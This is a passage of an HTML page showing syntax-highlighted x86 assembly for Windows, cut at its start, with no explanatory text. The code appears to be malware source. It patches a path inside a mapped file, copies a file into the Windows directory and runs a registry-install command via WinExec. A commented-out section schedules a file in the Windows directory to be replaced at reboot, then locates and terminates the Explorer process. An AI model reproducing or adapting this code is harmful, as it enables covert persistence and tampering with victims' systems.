        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@end</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">  
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">                
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">createf</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0"> 
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">filemap</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">    
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">map</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrlenW</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">map</span><span class="sc0">

</span><span class="sc5">@@loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">path</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@loop</span><span class="sc0">
        
        
            
                                    
                
                

</span><span class="sc5">@@end</span><span class="sc4">:</span><span class="sc0">          

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">new</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">97</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">new</span><span class="sc0"> 

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">dess</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">map</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filemap</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">createf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
        
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myfile2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">paty</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">instreg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc0">


</span><span class="sc9">comment</span><span class="sc0"> </span><span class="sc5">%</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">paty</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MoveFileA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">      

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">final</span><span class="sc0">       

    </span><span class="sc5">@@loopit</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@loopit</span><span class="sc0">
                
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">final</span><span class="sc0">   
                        

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myfile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">target</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">
        
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MoveFileExA</span><span class="sc0">
        
                        



        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">snap</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PE32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">snap</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Process32First</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">explore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">PE32.szExeName</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">
        

</span><span class="sc5">@@scan</span><span class="sc4">:</span><span class="sc0">
        
                
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PE32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">snap</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Process32Next</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">explore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">PE32.szExeName</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">       
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@scan</span><span class="sc0">



</span><span class="sc5">@@done</span><span class="sc4">:</span><span class="sc0">                     


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PE32.th32ProcessID</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenProcess</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TerminateProcess</span><span class="sc0">
        
</span><span class="sc5">%</span><span class="sc0">               

</span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
    
    </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> 


</span></div></body>
</html>
